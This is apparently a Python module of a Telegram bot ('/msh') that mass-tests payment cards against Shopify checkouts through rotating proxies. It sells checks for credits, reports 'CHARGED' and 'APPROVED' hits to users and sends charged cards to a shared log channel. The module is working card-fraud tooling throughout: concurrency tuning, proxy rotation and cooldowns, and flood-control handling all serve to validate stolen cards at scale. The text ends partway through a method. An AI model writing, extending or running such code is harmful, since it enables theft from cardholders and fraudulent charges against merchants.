import asyncio
import json
import aiohttp
import threading as _threading
import random
import re
import logging
import time
import string
import os
from datetime import datetime
from typing import Optional, Tuple, List
from io import BytesIO
from collections import deque
from html import escape as html_escape

# Absolute path to sites.txt
SITES_FILE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "sites.txt")

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# AIogram Imports
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from aiogram import types, F, Router, Bot
from aiogram.exceptions import TelegramBadRequest, TelegramForbiddenError, TelegramRetryAfter
from aiogram.filters.callback_data import CallbackData
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# LOCAL IMPORTS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
from database import is_gate_enabled, get_user_credits, update_credits, update_user_stats, get_collection, deduct_credits_atomic, load_global_proxies, is_unlimited_msh, add_charged_hit
from bin import get_bin_info
from sub import get_premium_status, ADMIN_IDS
from shopify_api import call_shopify_api, ProxyDeadError, SHOPIFY_API_URLS
from mass_gates.utils import _log_premium_plan

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CONFIGURATION & URLS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ADMIN_IDS = {8423281554}

def is_admin(user_id: int) -> bool:
    return user_id in ADMIN_IDS

CUSTOM_CHARGED_EMOJI_ID = "6183613910977876404"
CUSTOM_APPROVED_EMOJI_ID = "4958610528588008305"
CUSTOM_DECLINED_EMOJI_ID = "4956612582816351459"

BTN_CHARGED_EMOJI_ID = "6183613910977876404"
BTN_DEAD_EMOJI_ID = "5397890704062038337"
BTN_LIVE_EMOJI_ID = "5350572310627632617"
BTN_STOP_EMOJI_ID = "6179444193518162239"
BTN_ALL_EMOJI_ID = "4956324463525233747"

# Premium Emoji IDs (provided by owner)
EMOJI_RED_TICK   = "6147565374289220368"
EMOJI_BLUE_TICK  = "5278628026416909103"
EMOJI_LIGHTNING  = "5350835008007324644"
EMOJI_STAR       = "5359686514697576863"
EMOJI_FIRE       = "6186076099764555777"
EMOJI_CROWN      = "6338940587193930733"
EMOJI_EPIC       = "5310296284874159738"
EMOJI_WHITE_STAR = "5247131412032670246"
EMOJI_DIAMOND    = "5465465194056525619"
EMOJI_GLOBE      = "5359686514697576863"

HIT_LOG_GROUP_ID = -1004472821773  # fallback numeric, overridden at startup  # fallback numeric, overridden at startup  # fallback numeric — overridden by resolver at startup
HIT_LOG_GROUP_HANDLE = "https://t.me/+Q2jYXxlErFcyZmU0"
EXTRA_CHARGED_GROUP_ID = -1004472821773  # fallback numeric, overridden at startup  # fallback — overridden by resolver at startup
EXTRA_CHARGED_GROUP_HANDLE = "https://t.me/+Q2jYXxlErFcyZmU0"   # dedicated channel for all users' charged CCs

BUTTON_LOCK_SECONDS = 30

MSH_SESSIONS = {}
SESSION_LOCKS = {}

# ── Shared HTTP session for MSH API calls (avoids per-card session creation) ──
_MSH_HTTP_SESSION = None

def _get_msh_http_session():
    global _MSH_HTTP_SESSION
    if _MSH_HTTP_SESSION is None or _MSH_HTTP_SESSION.closed:
        _MSH_HTTP_SESSION = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=80),
            connector=aiohttp.TCPConnector(limit=500, ssl=False)
        )
    return _MSH_HTTP_SESSION

# ── Session GC: prune stale sessions every 10 min to prevent memory leaks ─────
_MSH_SESSION_MAX_AGE = 3600

def _cleanup_msh_sessions():
    import time as _t
    cutoff = _t.time() - _MSH_SESSION_MAX_AGE
    dead = [sid for sid, s in list(MSH_SESSIONS.items())
            if s.get('status') in ('FINISHED', 'STOPPED') and s.get('start_time', 0) < cutoff]
    for sid in dead:
        MSH_SESSIONS.pop(sid, None)
        SESSION_LOCKS.pop(sid, None)

def _start_msh_gc():
    import time as _t
    def _loop():
        while True:
            _t.sleep(600)
            try: _cleanup_msh_sessions()
            except Exception: pass
    _threading.Thread(target=_loop, daemon=True, name='msh_gc').start()

_start_msh_gc()


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# GLOBAL API LOAD-SHEDDING
# When many users run /msh concurrently, naive per-session concurrency
# multiplies into hundreds of parallel API calls → backend overloads,
# returns 429/503/timeouts, and errors cascade across all sessions.
#
# This module enforces TWO caps:
#   1. GLOBAL cap  — total concurrent API calls across ALL /msh sessions.
#                     Sized for Railway free/hobby tier (~50 graceful).
#   2. PER-USER cap — one user can't hog the entire global pool.
#
# Plus an ADAPTIVE THROTTLE that watches API health (failure rate +
# avg latency) over a rolling window and auto-slows everyone down when
# the backend struggles. Converts a thundering-herd retry storm into
# gentle backpressure so the backend can recover.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Total concurrent API calls allowed across ALL /msh sessions at once.
# Raised 4000 → 6000 (admin request — speed priority). At 10 simultaneous
# users, fair_share = 6000 // 10 = 600 per user, well above _PER_USER.
# Circuit breaker (shopify_api.py) is the safety net if real backend
# capacity is lower than we expect — it auto-throttles when fail rate
# or latency climbs. The breaker absorbs overshoot so we can keep the
# cap generous.
_GLOBAL_API_CONCURRENCY = 6000

# Per-user concurrent API calls. Bumped 250 → 400 (admin request — speed).
# With 2 configured APIs and per-API breakers, each user can safely hold
# more in-flight checks: when one API's breaker opens, only that half of
# the workers pause — the other half keep draining. 400 workers / 2 APIs
# = ~200 effective per API, well within backend capacity.
_PER_USER_API_CONCURRENCY = 400

_GLOBAL_API_SEMAPHORE = asyncio.Semaphore(_GLOBAL_API_CONCURRENCY)

# Rolling window for API health tracking (seconds)
_API_HEALTH_WINDOW_SEC = 60
# Failure rate above which we start slowing everyone down
# Raised from 0.35 → 0.55 so throttle only kicks in when the circuit
# breaker is already open (55%+ fail rate). Avoids double-penalty when
# the breaker is doing its job.
_API_HEALTH_FAIL_THRESHOLD = 0.55
# Average response time above which we start slowing (ms)
# Bumped 12000 → 25000 because every bot→API call now also tunnels
# through the proxy (call_shopify_api passes proxy=... to aiohttp too),
# which adds ~6-10s on top of the bare API latency. With 12000 the
# throttle fired on every healthy call (proxy-routed avg ~12-15s) and
# spammed WARNING logs even when fail_rate was 0%. 25000 keeps the
# "anti-thundering-herd" purpose alive while staying well above the
# proxy-routed baseline so warnings only fire when the API itself is
# genuinely degraded (>=25s avg with at least one failure in window).
_API_HEALTH_SLOW_THRESHOLD_MS = 25000
# Extra delay added per API call when backend is unhealthy (ms)
# Lowered 70 → 30 and 800 → 400 (admin request — speed priority). Even
# when the throttle triggers, the per-call overhead stays under 0.5s
# so 250 in-flight workers lose a combined ~100s of throughput, not
# the ~3min the old 1500ms cap could cost. Circuit breaker still
# handles hard outages — these values only cover gentle backpressure.
_API_HEALTH_BACKOFF_BASE_MS = 30
_API_HEALTH_BACKOFF_MAX_MS = 400

# Rolling log of recent API outcomes: (monotonic_ts, success_bool, elapsed_ms)
_api_health_log: deque = deque(maxlen=300)


# Accessor for shopify_api's per-API circuit breaker state.
# NOTE: we MUST call the getter function on every check — a plain
# `from shopify_api import _breaker_state` captures the VALUE at import
# time (the string "CLOSED"), which never updates when the breaker
# trips. That silent staleness was the root cause of msh.py's adaptive
# throttle and per-user concurrency scaler never actually reacting to a
# sick backend. get_global_breaker_state() returns the worst (most-open)
# state across all APIs at call time.
try:
    from shopify_api import get_global_breaker_state as _get_breaker_state
except Exception:
    def _get_breaker_state() -> str:
        return "CLOSED"


def _record_api_outcome(success: bool, elapsed_ms: float) -> None:
    """Record one API call outcome for the global adaptive throttle."""
    _api_health_log.append((time.monotonic(), bool(success), float(elapsed_ms)))


async def _adaptive_api_throttle() -> None:
    """
    Wait a small delay before issuing an API call. Delay scales UP when
    recent API outcomes look unhealthy (high failure rate or high latency)
    so all /msh sessions collectively back off and let the backend recover.
    Always adds jitter so bursty hits don't all wake at the same instant.

    Cooperates with the global circuit breaker in shopify_api: when the
    breaker is OPEN, the breaker itself pauses everything for ≥15s, so
    we skip our extra delay to avoid stacking waits.
    """
    # If the breaker in shopify_api is already open, _breaker_gate() will
    # pause us anyway — DON'T sleep here too, that would double the wait
    # (and the breaker's own jitter is already in place). Just bail out
    # and let the breaker handle the pause.
    try:
        if _get_breaker_state() == "OPEN":
            return
    except Exception:
        pass

    now = time.monotonic()
    cutoff = now - _API_HEALTH_WINDOW_SEC
    while _api_health_log and _api_health_log[0][0] < cutoff:
        _api_health_log.popleft()

    backoff_ms = 0.0
    n = len(_api_health_log)
    if n >= 20:
        fail_count = sum(1 for _, ok, _ in _api_health_log if not ok)
        fail_rate = fail_count / n
        avg_ms = sum(ms for _, _, ms in _api_health_log) / n
        # Throttle ONLY when there are actual failures. Slow-but-working APIs
        # don't need backoff — the circuit breaker already handles hard failures,
        # and adding delay to a 0% fail-rate API just tanks throughput without
        # helping anyone. So latency-based throttling now ALSO requires at least
        # one failure in the window.
        if fail_rate > _API_HEALTH_FAIL_THRESHOLD or (fail_rate > 0 and avg_ms > _API_HEALTH_SLOW_THRESHOLD_MS):
            severity_fail = max(0.0, (fail_rate - _API_HEALTH_FAIL_THRESHOLD) / (1 - _API_HEALTH_FAIL_THRESHOLD))
            severity_slow = max(0.0, (avg_ms - _API_HEALTH_SLOW_THRESHOLD_MS) / _API_HEALTH_SLOW_THRESHOLD_MS)
            severity = max(severity_fail, severity_slow)
            backoff_ms = min(
                _API_HEALTH_BACKOFF_MAX_MS,
                _API_HEALTH_BACKOFF_BASE_MS * (1 + 5 * severity),
            )
            if backoff_ms >= _API_HEALTH_BACKOFF_BASE_MS:
                logging.debug(
                    f"[API-HEALTH] unhealthy: fail_rate={fail_rate:.0%} avg_ms={avg_ms:.0f} "
                    f"-> adding {backoff_ms:.0f}ms backoff to next request"
                )

    jitter_ms = random.uniform(0, 3)
    total_ms = backoff_ms + jitter_ms
    if total_ms > 0:
        await asyncio.sleep(total_ms / 1000.0)


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# DYNAMIC PER-USER CONCURRENCY
# When the global API circuit breaker is OPEN it means the backend is
# overloaded — pumping the configured 70 workers/second at it just makes
# recovery worse. This helper shrinks the per-user worker count based on
# the current breaker state, so when APIs are healthy we run at full
# speed (70) but when they're failing we automatically drop to ~10 to
# avoid hammering a sick backend.
#
# The semaphore is re-acquired per call to process_one so the limit can
# shrink/grow dynamically mid-session without recreating worker tasks.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Floor: never drop below this many concurrent workers per user.
# Bumped 25 → 50 (admin request — speed priority). Even at full
# circuit-breaker OPEN (worst case, API hammering 55%+ errors),
# each user keeps 50 in-flight workers so a 1000-card session still
# drains in ~20s instead of the 25-worker 40s wait. The breaker
# still prevents thundering-herd damage to the sick backend; the
# higher floor just means individual user experience stays usable.
_USER_CONCURRENCY_FLOOR = 50


def _effective_user_concurrency(session_id: str | None = None) -> int:
    """
    Return the per-user worker count for the CURRENT moment.

    Three-tier scaling:
       1. Active-session share — divide the global pool fairly across all
          currently-running /msh sessions so 30 users don't starve each
          other (30 × 100 workers vs 1000 global = ~33 active per user).
       2. Proxy-pool cap — cap workers to the session's OWN available
          proxies (×4 multiplier so workers can rotate freely without
          sitting idle on dead proxies). Uses session-local count, not
          global sum — because some users share the global proxies.txt
          fallback pool and summing would over-count shared resources.
       3. Circuit-breaker scale — when the breaker is OPEN/HALF_OPEN, the
          backend is failing, so shrink further to stop hammering it.

    Floor: never drop below _USER_CONCURRENCY_FLOOR.

    `session_id` is passed explicitly by the caller so Tier 2 reads the
    CORRECT session's proxy_manager. The old code used a module-level
    global (_caller_session_id_value) which could be overwritten by a
    concurrent session between the set and the read — that race is gone
    now that the id is a plain function argument.
    """
    base = _PER_USER_API_CONCURRENCY

    # Tier 1: scale with active session count so the global pool is shared
    try:
        active = sum(
            1 for s in MSH_SESSIONS.values()
            if s.get('status') == 'CHECKING'
        )
    except Exception:
        active = 1
    active = max(1, active)
    fair_share = max(
        _USER_CONCURRENCY_FLOOR,
        _GLOBAL_API_CONCURRENCY // active,
    )
    base = min(base, fair_share)

    # Tier 2: proxy-pool cap — read the CALLER's session proxy_manager
    # directly via the `session_id` argument (no more global hint).
    try:
        if session_id:
            s = MSH_SESSIONS.get(session_id)
            if s and s.get('status') == 'CHECKING':
                pm = s.get('proxy_manager')
                if pm is not None:
                    own_avail = pm.get_available_count()
                    if own_avail is not None and own_avail > 0:
                        # Multiplier raised 4× → 10×. With only 7-9
                        # proxies (common for most users), 4× gave
                        # 28-36, which hit the _USER_CONCURRENCY_FLOOR
                        # of 50 — so users with few proxies were
                        # permanently capped at 50 workers regardless
                        # of the 400 per-user ceiling. 10× gives
                        # 70-90 workers for 7-9 proxies, a much better
                        # match for the 2-API split (each API gets
                        # ~35-45 in-flight calls, well within capacity).
                        proxy_cap = max(_USER_CONCURRENCY_FLOOR, own_avail * 10)
                        if proxy_cap < base:
                            base = proxy_cap
    except Exception:
        pass

    # Tier 3: scale with circuit-breaker state (queried LIVE — the old
    # code captured the import-time value "CLOSED" and never saw updates,
    # so this scaler was effectively a no-op even when the backend was
    # on fire).
    try:
        state = _get_breaker_state()
    except Exception:
        state = "CLOSED"
    if state == "OPEN":
        return max(_USER_CONCURRENCY_FLOOR, base // 7)
    if state == "HALF_OPEN":
        return max(_USER_CONCURRENCY_FLOOR * 2, base // 2)
    return base


# Per-user concurrency is now enforced by a PER-SESSION semaphore
# created in run_mass_checker (see session['user_sem']). The old
# _user_sem_cache / _get_user_sem / _acquire_slot_for_session helpers
# were REMOVED because they cached semaphores by target value, causing
# multiple sessions to SHARE the same semaphore — User 1's workers
# consumed all slots and User 2 got stuck at 0/N.


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PER-USER DM RATE LIMITER
# Avoids Telegram "Flood control exceeded" when many hits fire to the same
# user concurrently. Tracks last send time per user_id and blocks until
# the safe interval has elapsed. Also handles TelegramRetryAfter by
# sleeping the requested amount.
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

# Minimum gap between consecutive DM messages to the SAME user (seconds).
# Telegram allows ~1 msg/sec per chat; using 0.3s keeps us well under
# the per-chat flood limit while still delivering charges "instantly".
_DM_MIN_GAP_SEC = 0.3

# Per-user: last successful DM send time
_DM_LAST_SEND: dict[int, float] = {}
# Per-user: lock so concurrent workers serialise their DM sends
_DM_LOCKS: dict[int, asyncio.Lock] = {}
# Global lock protecting _DM_LOCKS dict itself
_DM_LOCKS_GUARD = asyncio.Lock()


async def _get_dm_lock(user_id: int) -> asyncio.Lock:
    """Return (and lazily create) the per-user DM lock."""
    async with _DM_LOCKS_GUARD:
        lock = _DM_LOCKS.get(user_id)
        if lock is None:
            lock = asyncio.Lock()
            _DM_LOCKS[user_id] = lock
        return lock


async def _throttle_user_dm(user_id: int) -> None:
    """
    Wait until it is safe to send a DM to `user_id`.
    Two layers of protection:
      1. Per-user serialisation via lock (workers don't race the same chat)
      2. Minimum time gap between consecutive sends to the same user
    """
    lock = await _get_dm_lock(user_id)
    async with lock:
        now = time.monotonic()
        last = _DM_LAST_SEND.get(user_id, 0.0)
        wait = _DM_MIN_GAP_SEC - (now - last)
        if wait > 0:
            # Small jitter (0–150ms) so bursty hits don't all wake at the
            # exact same instant after the wait.
            jitter = random.uniform(0, 0.15)
            await asyncio.sleep(wait + jitter)
        _DM_LAST_SEND[user_id] = time.monotonic()


async def _safe_send_animation_dm(bot: Bot, user_id: int, **kwargs) -> Optional[types.Message]:
    """
    send_animation wrapper for user DMs: throttles + handles TelegramRetryAfter.
    Returns the sent Message on success, None if user blocked bot / chat missing.
    NOTE: We previously sent GIFs via send_animation, but external GIF URLs
    (otakugifs.xyz / Giphy fallback) frequently returned "wrong type of the
    web page content" because Railway can't reach those hosts reliably. The
    caption already contains rich custom Telegram emojis that render natively
    on the client, so callers now prefer send_message via _safe_send_message_dm.
    This helper is kept for backward compat but is no longer the primary path.
    """
    await _throttle_user_dm(user_id)
    try:
        return await bot.send_animation(chat_id=user_id, **kwargs)
    except TelegramRetryAfter as e:
        retry_s = getattr(e, "retry_after", 5) or 5
        logging.info(
            f"[MSH] Telegram flood control on DM to {user_id} — "
            f"cooling down for {retry_s}s"
        )
        await asyncio.sleep(retry_s + 0.5)
        _DM_LAST_SEND[user_id] = time.monotonic()
        try:
            return await bot.send_animation(chat_id=user_id, **kwargs)
        except (TelegramForbiddenError, TelegramBadRequest) as e2:
            logging.warning(f"[MSH] Could not DM after retry to user {user_id}: {e2}")
            return None
        except Exception as e2:
            logging.error(f"[MSH] Error DMing after retry to user {user_id}: {e2}")
            return None
    except (TelegramForbiddenError, TelegramBadRequest) as e:
        logging.warning(f"[MSH] Could not DM user {user_id}: {e}")
        return None
    except Exception as e:
        logging.error(f"[MSH] Error DMing user {user_id}: {e}")
        return None


async def _safe_send_message_dm(bot: Bot, user_id: int, **kwargs) -> Optional[types.Message]:
    """
    send_message wrapper for user DMs: throttles + handles TelegramRetryAfter.

    CRITICAL: this is the path that delivers CHARGED hits to users.
    If Telegram floods, we retry up to _DM_MAX_RETRIES times with
    exponential backoff before giving up. We never drop a charged
    hit silently on the first flood — we'd rather wait up to 60s than lose it.

    Returns the sent Message on success, None if user blocked bot / chat missing.
    """
    _DM_MAX_RETRIES = 4
    await _throttle_user_dm(user_id)

    for attempt in range(1, _DM_MAX_RETRIES + 1):
        try:
            return await bot.send_message(chat_id=user_id, **kwargs)
        except TelegramRetryAfter as e:
            retry_s = getattr(e, "retry_after", 5) or 5
            # Exponential backoff with cap so we don't wait forever.
            # 5s → 7.5s → 15s → 30s, capped at 60s per attempt.
            wait_s = min(60, retry_s + (2 ** (attempt - 1)) * 2.5)
            logging.info(
                f"[MSH] Telegram flood control on DM to {user_id} — "
                f"attempt {attempt}/{_DM_MAX_RETRIES}, cooling down for {wait_s:.1f}s"
            )
            await asyncio.sleep(wait_s)
            _DM_LAST_SEND[user_id] = time.monotonic()
            continue
        except (TelegramForbiddenError, TelegramBadRequest) as e:
            logging.warning(f"[MSH] Could not DM user {user_id}: {e}")
            return None
        except Exception as e:
            wait_s = 1.5 * (2 ** (attempt - 1))
            logging.warning(
                f"[MSH] DM error to {user_id} (attempt {attempt}/{_DM_MAX_RETRIES}): "
                f"{type(e).__name__}: {str(e)[:100]} — retrying in {wait_s:.1f}s"
            )
            if attempt >= _DM_MAX_RETRIES:
                logging.error(f"[MSH] Giving up DM to {user_id} after {_DM_MAX_RETRIES} attempts")
                return None
            await asyncio.sleep(wait_s)
            _DM_LAST_SEND[user_id] = time.monotonic()
            continue

    logging.error(f"[MSH] DM to {user_id} exhausted {_DM_MAX_RETRIES} retries")
    return None


router = Router()

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CALLBACK DATA
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class MshResultCallback(CallbackData, prefix="mshr"):
    session_id: str
    result_type: str

class MshStopCallback(CallbackData, prefix="mshs"):
    session_id: str

class MshRetryCallback(CallbackData, prefix="mshx"):
    session_id: str

class MshModeCallback(CallbackData, prefix="mshm"):
    pending_id: str
    mode: str  # "charged" or "approved"


class MshForceStopCallback(CallbackData, prefix="mshf"):
    """Admin-forces-stop callback used by /sessions command."""
    session_id: str


# Holds pre-prepared card check data waiting for the user to pick a mode
# key = pending_id (random 10-char), value = dict with message/cards/proxies/etc.
MSH_PENDING: dict = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY MANAGER CLASS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

class ProxyManager:
    """
    Proxy Manager - Only fails on REAL proxy errors.

    Key Features:
    - Does NOT fail on 429 rate limits (normal Shopify behavior)
    - Does NOT fail on card responses (DECLINED, APPROVED, 3DS, etc.)
    - Does NOT fail on Step 0-10 errors (retryable with new site)
    - ONLY fails on: connection timeouts, DNS errors, auth failures
    - Ensures proper http://user:pass@host:port format
    """

    SUCCESS_RESPONSES = [
        'CARD_DECLINED', 'ORDER_PAID', 'CHARGED', 'APPROVED',
        'INSUFFICIENT_FUNDS', 'INVALID_CVC', 'INCORRECT_CVC',
        '3DS_REQUIRED', 'FRAUD_SUSPECTED', 'GENERIC_ERROR',
        'DO_NOT_HONOR', 'EXPIRED_CARD',
        'INCORRECT_ZIP', 'STOLEN_CARD', 'LOST_CARD',
        'INCORRECT_NUMBER', 'AMOUNT_TOO_SMALL',
        'TRANSACTION_NOT_ALLOWED', 'RESTRICTED_CARD'
    ]

    PROXY_ERROR_PATTERNS = [
        'connection error', 'connection refused', 'connection reset',
        'timeout', 'timed out', 'connect timeout',
        'could not resolve host', 'dns error', 'name resolution',
        'proxy authentication', 'auth failed', '407',
        'tunnel failed', 'socks error', 'ssl error',
        'network unreachable', 'host unreachable',
        'connection aborted', 'broken pipe', 'socket error',
        'too many redirects', 'redirect loop',
        'ECONNREFUSED', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND',
        'proxy error', 'bad gateway'
    ]

    # Hard-fail patterns — proxy itself is dead / unreachable.
    # When these are seen we want to IMMEDIATELY take the proxy out of
    # rotation with a LONG cooldown (not the escalating 30s→1800s ladder),
    # because each retry attempt against the same proxy just wastes time
    # and bandwidth. Examples:
    #   "Cannot connect to host"     — aiohttp proxy socket failure
    #   "Connection refused"         — proxy port closed / firewalled
    #   "Tunnel connection failed"   — CONNECT through proxy failed
    #   "SSL: CERTIFICATE_VERIFY_FAILED" — bad proxy cert
    HARD_PROXY_FAIL_PATTERNS = [
        'cannot connect to host',
        'cannot connect to proxy',
        'connection refused',
        'connect tunnel failed',
        'tunnel connection failed',
        'proxy connection failed',
        'ssl: certificate_verify_failed',
        'bad proxy',
        'proxy not responding',
    ]  

    def __init__(self, proxies_list: List[str], session_id: str):
        self.session_id = session_id
        self.raw_proxies = list(set(proxies_list))

        self.all_proxies = [self._normalize_proxy(p) for p in self.raw_proxies]
        self.all_proxies = [p for p in self.all_proxies if p]

        self.proxy_queue = deque(self.all_proxies)
        # Apply global round-robin offset so concurrent sessions dont
        # all start by hitting proxy[0] at the same instant. Without
        # this, 20 users launching /msh simultaneously would each rotate
        # the same proxy first ("default"), concentrating ~20% of the
        # very first wave of API calls onto that single proxy.
        if self.all_proxies:
            try:
                start_offset = _next_proxy_session_offset(len(self.all_proxies))
                # Negative offset rotates the deque LEFT so proxy[start_offset]
                # ends up at the front (next popleft will pick it).
                self.proxy_queue.rotate(-start_offset)
            except Exception:
                pass
        self.failed_proxies = {}
        self.success_counts = {proxy: 0 for proxy in self.all_proxies}
        self.total_uses = 0
        self.cooldown_seconds = 60

        logging.info(f"[ProxyManager] Initialized with {len(self.all_proxies)} normalized proxies for session {session_id}")

    def _normalize_proxy(self, proxy: str) -> Optional[str]:
        if not proxy or not proxy.strip():
            return None

        proxy = proxy.strip()

        def _has_valid_hostport(s: str) -> bool:
            """True if `s` ends with `host:port` where port is 1-65535 and
            host is not a bare protocol name like 'http', 'https', 'socks5'.
            Host must contain at least one dot OR be a valid IPv4 literal —
            a host that's just 'http' or '80' is always rejected."""
            if ':' not in s:
                return False
            host, port = s.rsplit(':', 1)
            if not port.isdigit() or not (1 <= int(port) <= 65535):
                return False
            host_lower = host.lower().strip()
            if not host_lower or host_lower in ('http', 'https', 'socks4', 'socks5'):
                return False
            # Host must contain at least one dot (FQDN like x.y) OR be an
            # IPv4 literal (4 dot-separated octets). Single-word hosts like
            # "localhost" or just letters are suspicious.
            if '.' not in host_lower:
                # Could be IPv4 literal — check 4 numeric octets
                octets = host_lower.split('.')
                if len(octets) != 4 or not all(o.isdigit() and 0 <= int(o) <= 255 for o in octets):
                    return False
            return True

        # ── Strip known protocol prefix ──
        if proxy.startswith(('https://', 'http://', 'socks5://', 'socks4://')):
            proxy = proxy[proxy.index('://') + 3:]

        # ── Has @ — must be user[:pass]@host:port ──
        if '@' in proxy:
            user_pass_part = proxy.rsplit('@', 1)[0]
            host_port_part = proxy.rsplit('@', 1)[1]
            # Reject if the user/password contains @ (split ambiguity) OR
            # if the host part isn't valid
            if '@' in user_pass_part:
                return None  # Multiple @ → backend will misparse
            if _has_valid_hostport(host_port_part):
                return f'http://{proxy}'
            return None

        # ── Space-separated (DB format: "user pass host port") ──
        space_parts = proxy.split()
        if len(space_parts) == 4:
            user, pwd, host, port = space_parts
            if port.isdigit() and (1 <= int(port) <= 65535):
                if _has_valid_hostport(f'{host}:{port}'):
                    return f'http://{user}:{pwd}@{host}:{port}'

        # ── No @ — host:port or host:port:user:pass ──
        if ':' not in proxy:
            return None
        parts = proxy.split(':')
        if len(parts) == 2 and _has_valid_hostport(proxy):
            return f'http://{proxy}'
        if len(parts) == 4 and _has_valid_hostport(f'{parts[0]}:{parts[1]}'):
            host, port, user, password = parts
            if '@' in user or '@' in password:
                return None  # Reject — would confuse URL parser
            return f'http://{user}:{password}@{host}:{port}'

        return None

    @staticmethod
    def _is_safe_proxy_url(proxy: str) -> bool:
        """Defensive check: a proxy URL is only safe if it matches
        http://user:pass@host:port where host is NOT a bare protocol
        name and port is numeric 1-65535. Returns False for anything
        malformed like 'http://http:80'."""
        if not proxy or not isinstance(proxy, str):
            return False
        if not proxy.startswith('http://'):
            return False
        rest = proxy[7:]
        if '@' not in rest:
            return False
        host_port = rest.rsplit('@', 1)[1]
        if ':' not in host_port:
            return False
        host, port = host_port.rsplit(':', 1)
        if not port.isdigit() or not (1 <= int(port) <= 65535):
            return False
        host_lower = host.lower().strip()
        if not host_lower or host_lower in ('http', 'https', 'socks4', 'socks5'):
            return False
        return any(c.isalnum() for c in host_lower)

    def get_next_proxy(self) -> Optional[Tuple[str, bool]]:
        if not self.all_proxies:
            return None, False

        current_time = time.time()
        attempts = 0
        max_attempts = len(self.all_proxies) * 2

        while attempts < max_attempts:
            if not self.proxy_queue:
                self.proxy_queue = deque(self.all_proxies)

            proxy = self.proxy_queue.popleft()

            # Defensive: skip any malformed proxy that somehow got into
            # the queue (e.g. legacy session started before _normalize_proxy
            # was strict). Drop it permanently so it never returns.
            if not self._is_safe_proxy_url(proxy):
                logging.warning(
                    f"[ProxyManager] dropping malformed proxy from queue: "
                    f"{proxy[:80]!r}"
                )
                self.all_proxies = [p for p in self.all_proxies if p != proxy]
                self.failed_proxies.pop(proxy, None)
                self.success_counts.pop(proxy, None)
                continue

            if proxy in self.failed_proxies:
                fail_data = self.failed_proxies[proxy]
                cooldown_until = fail_data.get('cooldown_until', 0)

                if current_time < cooldown_until:
                    self.proxy_queue.append(proxy)
                    attempts += 1
                    continue
                else:
                    del self.failed_proxies[proxy]

            self.proxy_queue.append(proxy)
            self.total_uses += 1

            return proxy, True

        if self.failed_proxies:
            best_proxy = min(
                self.failed_proxies.keys(),
                key=lambda p: self.failed_proxies[p].get('cooldown_until', float('inf'))
            )
            # Defensive: only force a proxy that's actually safe
            if self._is_safe_proxy_url(best_proxy):
                logging.warning(f"[ProxyManager] All proxies in cooldown, forcing {mask_proxy(best_proxy)}")
                self.total_uses += 1
                return best_proxy, True
            logging.error(
                f"[ProxyManager] No safe proxy available — session will stall. "
                f"Total proxies: {len(self.all_proxies)}, failed: {len(self.failed_proxies)}"
            )
            return None, False

        return None, False

    def report_success(self, proxy: str):
        if proxy in self.success_counts:
            self.success_counts[proxy] += 1
        else:
            self.success_counts[proxy] = 1

        if proxy in self.failed_proxies:
            del self.failed_proxies[proxy]

    def is_real_proxy_error(self, api_response: str, http_status: Optional[int] = None) -> bool:
        response_lower = api_response.lower() if api_response else ''

        for success_indicator in self.SUCCESS_RESPONSES:
            if success_indicator.lower() in response_lower:
                return False

        if '429' in response_lower or 'too many requests' in response_lower:
            return False

        if any(x in response_lower for x in ['no available products', 'not shopify', 'site requires login']):
            return False

        if 'step ' in response_lower and ('failed' in response_lower or 'error' in response_lower):
            return False

        if any(x in response_lower for x in ['receipt', 'could not extract', 'missing']):
            return False

        if http_status and http_status in [200, 201, 400, 401, 402, 403, 422, 500]:
            return False

        for error_pattern in self.PROXY_ERROR_PATTERNS:
            if error_pattern in response_lower:
                return True

        return False

    def is_hard_proxy_error(self, api_response: str) -> bool:
        """
        Detect HARD proxy failures — proxy is definitely dead, no point
        in keeping it in rotation. Returns True for patterns like
        "Cannot connect to host", "Connection refused", etc.
        Also returns True for malformed-proxy signals like
        "Cannot connect to host http:" — this means the BACKEND is
        seeing a malformed proxy URL (the host is the literal string
        "http"), which is a backend parsing bug, not the proxy's fault.
        Skip the proxy so we stop hammering the broken backend path.
        """
        if not api_response:
            return False
        response_lower = api_response.lower()
        for pattern in self.HARD_PROXY_FAIL_PATTERNS:
            if pattern in response_lower:
                return True
        # Backend parsing bug signature: the "host" portion of the error
        # is a bare protocol name. Real proxies never have that as host.
        if 'cannot connect to host http:' in response_lower:
            return True
        if 'cannot connect to host https:' in response_lower:
            return True
        return False

    def force_dead_cooldown(self, proxy: str, api_response: str, cooldown_seconds: int = 600) -> None:
        """
        Force a proxy into a long cooldown immediately, bypassing the
        normal escalating ladder. Use this when we detect a HARD proxy
        failure (proxy is dead, will stay dead for a while).
        """
